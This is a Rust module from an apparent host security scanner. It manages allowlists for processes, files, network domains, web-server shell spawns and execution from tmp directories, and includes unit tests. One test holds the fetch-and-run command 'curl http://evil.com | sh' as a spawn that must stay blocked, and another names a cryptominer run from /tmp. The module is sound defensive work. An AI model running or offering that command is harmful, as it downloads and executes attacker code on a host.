//! Allowlist management for suppressing false positives.
//!
//! This module provides comprehensive allowlisting capabilities including:
//! - Process allowlisting (paths, patterns, hashes)
//! - File allowlisting (path patterns, hashes, directory rules)
//! - Network allowlisting (IPs, domains, process paths)
//! - Web server spawn rules for legitimate shell spawns
//! - Tmp execution rules for package managers and systemd

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::Path;

/// Configuration for allowlists.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct AllowlistConfig {
    #[serde(default)]
    pub process: ProcessAllowlist,
    #[serde(default)]
    pub file: FileAllowlist,
    #[serde(default)]
    pub network: NetworkAllowlist,
}

/// Allowlist for processes.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessAllowlist {
    /// Exact executable paths to allow
    #[serde(default)]
    pub paths: Vec<String>,
    /// Process name patterns (regex)
    #[serde(default)]
    pub name_patterns: Vec<String>,
    /// SHA256 hashes of allowed executables
    #[serde(default)]
    pub hashes: Vec<String>,
    /// Web server spawn rules
    #[serde(default)]
    pub web_server_spawns: Vec<WebServerSpawnRule>,
    /// Tmp execution rules
    #[serde(default)]
    pub tmp_execution: TmpExecutionRules,
}

/// Allowlist for files.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FileAllowlist {
    /// File path patterns (glob)
    #[serde(default)]
    pub path_patterns: Vec<String>,
    /// SHA256 hashes of allowed files
    #[serde(default)]
    pub hashes: Vec<String>,
    /// Directory-specific rules for fine-grained control
    #[serde(default)]
    pub directories: Vec<DirectoryRule>,
}

/// Directory-specific allowlist rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectoryRule {
    /// Glob pattern for the directory path (e.g., "/var/www/*/vendor/**")
    pub path: String,
    /// Whether to apply recursively to subdirectories
    #[serde(default = "default_true")]
    pub recursive: bool,
    /// File extensions this rule applies to (empty = all)
    #[serde(default)]
    pub extensions: Vec<String>,
    /// Detection categories to suppress (e.g., ["SuspiciousFunction", "Obfuscation"])
    #[serde(default)]
    pub suppress_categories: Vec<String>,
    /// Optional reason for the rule (for documentation)
    #[serde(default)]
    pub reason: Option<String>,
}

/// Web server spawn allowlist rules.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebServerSpawnRule {
    /// Pattern for the parent process (e.g., "php-fpm", "apache2")
    pub parent_pattern: String,
    /// Allowed child process names (e.g., ["sh", "bash"])
    #[serde(default)]
    pub allowed_children: Vec<String>,
    /// Allowed command line patterns (regex, e.g., ["^/usr/bin/wp ", "^git "])
    #[serde(default)]
    pub allowed_cmdline_patterns: Vec<String>,
    /// Optional reason for the rule
    #[serde(default)]
    pub reason: Option<String>,
}

/// Rules for allowing execution from temporary directories.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TmpExecutionRules {
    /// Allow execution from systemd private tmp directories
    #[serde(default)]
    pub allow_systemd_private: bool,
    /// Allow execution from package manager tmp directories
    #[serde(default)]
    pub allow_package_manager: bool,
    /// Specific tmp path patterns to allow (glob)
    #[serde(default)]
    pub allowed_tmp_patterns: Vec<String>,
    /// Process names allowed to run from tmp
    #[serde(default)]
    pub allowed_process_names: Vec<String>,
}

impl Default for TmpExecutionRules {
    fn default() -> Self {
        Self {
            allow_systemd_private: true,
            allow_package_manager: true,
            allowed_tmp_patterns: vec![],
            allowed_process_names: vec![],
        }
    }
}

fn default_true() -> bool {
    true
}

/// Allowlist for network connections.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct NetworkAllowlist {
    /// Allowed IP addresses
    #[serde(default)]
    pub ips: Vec<String>,
    /// Allowed domains
    #[serde(default)]
    pub domains: Vec<String>,
    /// Process paths allowed to make any connection
    #[serde(default)]
    pub process_paths: Vec<String>,
}

/// Compiled web server spawn rule.
struct CompiledWebServerSpawnRule {
    parent_pattern: Regex,
    allowed_children: HashSet<String>,
    allowed_cmdline_patterns: Vec<Regex>,
}

/// Compiled directory rule.
struct CompiledDirectoryRule {
    path_pattern: glob::Pattern,
    recursive: bool,
    extensions: HashSet<String>,
    suppress_categories: HashSet<String>,
}

/// Compiled allowlist checker for efficient matching.
pub struct AllowlistChecker {
    // Process allowlist
    process_paths: HashSet<String>,
    process_name_patterns: Vec<Regex>,
    process_hashes: HashSet<String>,

    // Web server spawn rules
    web_server_spawn_rules: Vec<CompiledWebServerSpawnRule>,

    // Tmp execution rules
    tmp_execution: TmpExecutionRules,
    tmp_patterns: Vec<glob::Pattern>,

    // File allowlist
    file_path_patterns: Vec<glob::Pattern>,
    file_hashes: HashSet<String>,
    directory_rules: Vec<CompiledDirectoryRule>,

    // Network allowlist
    network_ips: HashSet<String>,
    network_domains: HashSet<String>,
    network_process_paths: HashSet<String>,
}

impl AllowlistChecker {
    /// Create a new allowlist checker from configuration.
    pub fn new(config: &AllowlistConfig) -> Self {
        let process_name_patterns = config
            .process
            .name_patterns
            .iter()
            .filter_map(|p| Regex::new(p).ok())
            .collect();

        let file_path_patterns = config
            .file
            .path_patterns
            .iter()
            .filter_map(|p| glob::Pattern::new(p).ok())
            .collect();

        // Compile web server spawn rules
        let web_server_spawn_rules = config
            .process
            .web_server_spawns
            .iter()
            .filter_map(|rule| {
                let parent_pattern = Regex::new(&rule.parent_pattern).ok()?;
                let allowed_cmdline_patterns = rule
                    .allowed_cmdline_patterns
                    .iter()
                    .filter_map(|p| Regex::new(p).ok())
                    .collect();
                Some(CompiledWebServerSpawnRule {
                    parent_pattern,
                    allowed_children: rule.allowed_children.iter().cloned().collect(),
                    allowed_cmdline_patterns,
                })
            })
            .collect();

        // Compile tmp patterns
        let tmp_patterns = config
            .process
            .tmp_execution
            .allowed_tmp_patterns
            .iter()
            .filter_map(|p| glob::Pattern::new(p).ok())
            .collect();

        // Compile directory rules
        let directory_rules = config
            .file
            .directories
            .iter()
            .filter_map(|rule| {
                let path_pattern = glob::Pattern::new(&rule.path).ok()?;
                Some(CompiledDirectoryRule {
                    path_pattern,
                    recursive: rule.recursive,
                    extensions: rule.extensions.iter().map(|e| e.to_lowercase()).collect(),
                    suppress_categories: rule.suppress_categories.iter().cloned().collect(),
                })
            })
            .collect();

        Self {
            process_paths: config.process.paths.iter().cloned().collect(),
            process_name_patterns,
            process_hashes: config.process.hashes.iter().cloned().collect(),
            web_server_spawn_rules,
            tmp_execution: config.process.tmp_execution.clone(),
            tmp_patterns,
            file_path_patterns,
            file_hashes: config.file.hashes.iter().cloned().collect(),
            directory_rules,
            network_ips: config.network.ips.iter().cloned().collect(),
            network_domains: config.network.domains.iter().cloned().collect(),
            network_process_paths: config.network.process_paths.iter().cloned().collect(),
        }
    }

    /// Check if a process is allowlisted.
    pub fn is_process_allowed(&self, path: Option<&Path>, name: &str, hash: Option<&str>) -> bool {
        // Check path
        if let Some(p) = path {
            if let Some(path_str) = p.to_str() {
                if self.process_paths.contains(path_str) {
                    return true;
                }
            }
        }

        // Check name patterns
        for pattern in &self.process_name_patterns {
            if pattern.is_match(name) {
                return true;
            }
        }

        // Check hash
        if let Some(h) = hash {
            if self.process_hashes.contains(h) {
                return true;
            }
        }

        false
    }

    /// Check if a file is allowlisted.
    pub fn is_file_allowed(&self, path: &Path, hash: Option<&str>) -> bool {
        // Check path patterns
        if let Some(path_str) = path.to_str() {
            for pattern in &self.file_path_patterns {
                if pattern.matches(path_str) {
                    return true;
                }
            }
        }

        // Check hash
        if let Some(h) = hash {
            if self.file_hashes.contains(h) {
                return true;
            }
        }

        false
    }

    /// Check if a network connection is allowlisted.
    pub fn is_connection_allowed(
        &self,
        remote_ip: &str,
        domain: Option<&str>,
        process_path: Option<&Path>,
    ) -> bool {
        // Check IP
        if self.network_ips.contains(remote_ip) {
            return true;
        }

        // Check domain
        if let Some(d) = domain {
            if self.network_domains.contains(d) {
                return true;
            }
            // Check if it's a proper subdomain of an allowed domain
            // e.g., "sub.example.com" is a subdomain of "example.com"
            // but "malwareexample.com" is NOT a subdomain of "example.com"
            for allowed in &self.network_domains {
                // Must end with ".allowed" to be a proper subdomain
                let subdomain_suffix = format!(".{}", allowed);
                if d.ends_with(&subdomain_suffix) {
                    return true;
                }
            }
        }

        // Check process path
        if let Some(p) = process_path {
            if let Some(path_str) = p.to_str() {
                if self.network_process_paths.contains(path_str) {
                    return true;
                }
            }
        }

        false
    }

    /// Check if the allowlist is empty (no rules defined).
    pub fn is_empty(&self) -> bool {
        self.process_paths.is_empty()
            && self.process_name_patterns.is_empty()
            && self.process_hashes.is_empty()
            && self.file_path_patterns.is_empty()
            && self.file_hashes.is_empty()
            && self.network_ips.is_empty()
            && self.network_domains.is_empty()
            && self.network_process_paths.is_empty()
    }

    /// Check if a web server shell spawn is allowed.
    ///
    /// Returns true if the spawn matches a configured web server spawn rule.
    pub fn is_web_server_spawn_allowed(
        &self,
        parent_name: &str,
        child_name: &str,
        cmdline: &str,
    ) -> bool {
        for rule in &self.web_server_spawn_rules {
            // Check if parent matches
            if !rule.parent_pattern.is_match(parent_name) {
                continue;
            }

            // Check if child is allowed
            if rule.allowed_children.contains(child_name) {
                // Check cmdline patterns if specified
                if rule.allowed_cmdline_patterns.is_empty() {
                    return true;
                }

                for pattern in &rule.allowed_cmdline_patterns {
                    if pattern.is_match(cmdline) {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Check if execution from a tmp path is allowed.
    pub fn is_tmp_execution_allowed(&self, exe_path: &Path, process_name: &str) -> bool {
        let path_str = exe_path.to_string_lossy();

        // Check systemd private tmp
        if self.tmp_execution.allow_systemd_private {
            if path_str.contains("/tmp/systemd-private-")
                || path_str.contains("/var/tmp/systemd-private-")
            {
                return true;
            }
        }

        // Check package manager tmp
        if self.tmp_execution.allow_package_manager {
            // Common package manager tmp patterns
            if path_str.contains("/tmp/npm-")
                || path_str.contains("/tmp/yarn-")
                || path_str.contains("/tmp/pip-")
                || path_str.contains("/tmp/go-build")
                || path_str.contains("/tmp/cargo-install")
                || path_str.contains("/var/cache/apt/")
                || path_str.contains("/var/cache/pacman/")
            {
                return true;
            }
        }

        // Check explicit patterns
        for pattern in &self.tmp_patterns {
            if pattern.matches(&path_str) {
                return true;
            }
        }

        // Check allowed process names
        if self.tmp_execution.allowed_process_names.contains(&process_name.to_string()) {
            return true;
        }

        false
    }

    /// Get suppressed categories for a file path.
    ///
    /// Returns a set of detection category names that should be suppressed
    /// for the given file path based on directory rules.
    pub fn get_suppressed_categories(&self, path: &Path) -> HashSet<String> {
        let mut suppressed = HashSet::new();
        let path_str = path.to_string_lossy();

        // Check file extension
        let extension = path
            .extension()
            .and_then(|e| e.to_str())
            .map(|e| e.to_lowercase())
            .unwrap_or_default();

        for rule in &self.directory_rules {
            // Check if path matches the pattern
            if !rule.path_pattern.matches(&path_str) {
                continue;
            }

            // Check extension filter
            if !rule.extensions.is_empty() && !rule.extensions.contains(&extension) {
                continue;
            }

            // Add suppressed categories
            suppressed.extend(rule.suppress_categories.iter().cloned());
        }

        suppressed
    }

    /// Check if a specific detection category should be suppressed for a file.
    pub fn should_suppress_category(&self, path: &Path, category: &str) -> bool {
        self.get_suppressed_categories(path).contains(category)
    }
}

impl Default for AllowlistChecker {
    fn default() -> Self {
        Self::new(&AllowlistConfig::default())
    }
}

impl Default for ProcessAllowlist {
    fn default() -> Self {
        Self {
            paths: vec![],
            name_patterns: vec![],
            hashes: vec![],
            web_server_spawns: vec![],
            tmp_execution: TmpExecutionRules::default(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_allowlist() {
        let checker = AllowlistChecker::default();
        assert!(checker.is_empty());
        assert!(!checker.is_process_allowed(None, "test", None));
    }

    #[test]
    fn test_process_path_allowlist() {
        let config = AllowlistConfig {
            process: ProcessAllowlist {
                paths: vec!["/usr/bin/safe".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);
        assert!(checker.is_process_allowed(Some(Path::new("/usr/bin/safe")), "safe", None));
        assert!(!checker.is_process_allowed(Some(Path::new("/usr/bin/unsafe")), "unsafe", None));
    }

    #[test]
    fn test_process_name_pattern() {
        let config = AllowlistConfig {
            process: ProcessAllowlist {
                name_patterns: vec!["^systemd.*".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);
        assert!(checker.is_process_allowed(None, "systemd-resolved", None));
        assert!(!checker.is_process_allowed(None, "malware", None));
    }

    #[test]
    fn test_file_allowlist() {
        let config = AllowlistConfig {
            file: FileAllowlist {
                path_patterns: vec!["/var/log/*.log".to_string()],
                hashes: vec!["abc123".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);
        assert!(checker.is_file_allowed(Path::new("/var/log/test.log"), None));
        assert!(checker.is_file_allowed(Path::new("/etc/passwd"), Some("abc123")));
        assert!(!checker.is_file_allowed(Path::new("/etc/shadow"), None));
    }

    #[test]
    fn test_network_allowlist() {
        let config = AllowlistConfig {
            network: NetworkAllowlist {
                ips: vec!["8.8.8.8".to_string()],
                domains: vec!["example.com".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);
        assert!(checker.is_connection_allowed("8.8.8.8", None, None));
        assert!(checker.is_connection_allowed("1.2.3.4", Some("example.com"), None));
        assert!(checker.is_connection_allowed("1.2.3.4", Some("sub.example.com"), None));
        assert!(!checker.is_connection_allowed("1.2.3.4", Some("malware.com"), None));
    }

    #[test]
    fn test_subdomain_check_no_false_positives() {
        // Verify that "malwareexample.com" doesn't match "example.com"
        let config = AllowlistConfig {
            network: NetworkAllowlist {
                domains: vec!["example.com".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);

        // These should match (exact or proper subdomain)
        assert!(checker.is_connection_allowed("1.2.3.4", Some("example.com"), None));
        assert!(checker.is_connection_allowed("1.2.3.4", Some("sub.example.com"), None));
        assert!(checker.is_connection_allowed("1.2.3.4", Some("deep.sub.example.com"), None));

        // These should NOT match (not a proper subdomain)
        assert!(!checker.is_connection_allowed("1.2.3.4", Some("malwareexample.com"), None));
        assert!(!checker.is_connection_allowed("1.2.3.4", Some("fakeexample.com"), None));
        assert!(!checker.is_connection_allowed("1.2.3.4", Some("example.com.malware.com"), None));
    }

    #[test]
    fn test_web_server_spawn_rules() {
        let config = AllowlistConfig {
            process: ProcessAllowlist {
                web_server_spawns: vec![WebServerSpawnRule {
                    parent_pattern: "php-fpm".to_string(),
                    allowed_children: vec!["sh".to_string(), "bash".to_string()],
                    allowed_cmdline_patterns: vec!["^/usr/bin/wp ".to_string(), "^git ".to_string()],
                    reason: Some("WordPress CLI".to_string()),
                }],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);

        // Should allow wp-cli from php-fpm
        assert!(checker.is_web_server_spawn_allowed("php-fpm", "bash", "/usr/bin/wp cache flush"));

        // Should allow git from php-fpm
        assert!(checker.is_web_server_spawn_allowed("php-fpm", "sh", "git pull"));

        // Should NOT allow arbitrary commands
        assert!(!checker.is_web_server_spawn_allowed("php-fpm", "bash", "curl http://evil.com | sh"));

        // Should NOT allow from non-matching parent
        assert!(!checker.is_web_server_spawn_allowed("nginx", "bash", "/usr/bin/wp cache flush"));
    }

    #[test]
    fn test_tmp_execution_rules() {
        let config = AllowlistConfig {
            process: ProcessAllowlist {
                tmp_execution: TmpExecutionRules {
                    allow_systemd_private: true,
                    allow_package_manager: true,
                    allowed_tmp_patterns: vec!["/tmp/my-app-*".to_string()],
                    allowed_process_names: vec!["pytest".to_string()],
                },
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);

        // Should allow systemd private tmp
        assert!(checker.is_tmp_execution_allowed(
            Path::new("/tmp/systemd-private-abc123/something"),
            "service"
        ));

        // Should allow npm tmp
        assert!(checker.is_tmp_execution_allowed(Path::new("/tmp/npm-12345/script.js"), "node"));

        // Should allow explicit pattern
        assert!(checker.is_tmp_execution_allowed(Path::new("/tmp/my-app-cache/run"), "app"));

        // Should allow by process name
        assert!(checker.is_tmp_execution_allowed(Path::new("/tmp/random/test"), "pytest"));

        // Should NOT allow arbitrary tmp execution
        assert!(!checker.is_tmp_execution_allowed(Path::new("/tmp/suspicious/miner"), "xmrig"));
    }

    #[test]
    fn test_directory_rules() {
        let config = AllowlistConfig {
            file: FileAllowlist {
                directories: vec![
                    DirectoryRule {
                        path: "/var/www/*/vendor/**".to_string(),
                        recursive: true,
                        extensions: vec!["php".to_string()],
                        suppress_categories: vec![
                            "SuspiciousFunction".to_string(),
                            "Obfuscation".to_string(),
                        ],
                        reason: Some("Composer vendor directory".to_string()),
                    },
                ],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);

        // Should suppress for PHP files in vendor
        let suppressed = checker.get_suppressed_categories(
            Path::new("/var/www/html/vendor/monolog/monolog/Logger.php")
        );
        assert!(suppressed.contains("SuspiciousFunction"));
        assert!(suppressed.contains("Obfuscation"));

        // Should NOT suppress for non-PHP files
        let suppressed = checker.get_suppressed_categories(
            Path::new("/var/www/html/vendor/readme.txt")
        );
        assert!(suppressed.is_empty());

        // Should NOT suppress outside vendor
        let suppressed = checker.get_suppressed_categories(
            Path::new("/var/www/html/app/Controller.php")
        );
        assert!(suppressed.is_empty());
    }

    #[test]
    fn test_should_suppress_category() {
        let config = AllowlistConfig {
            file: FileAllowlist {
                directories: vec![DirectoryRule {
                    path: "/cache/**".to_string(),
                    recursive: true,
                    extensions: vec![],
                    suppress_categories: vec!["Obfuscation".to_string()],
                    reason: None,
                }],
                ..Default::default()
            },
            ..Default::default()
        };

        let checker = AllowlistChecker::new(&config);

        assert!(checker.should_suppress_category(
            Path::new("/cache/compiled/template.php"),
            "Obfuscation"
        ));

        assert!(!checker.should_suppress_category(
            Path::new("/cache/compiled/template.php"),
            "KnownSignature"
        ));
    }
}
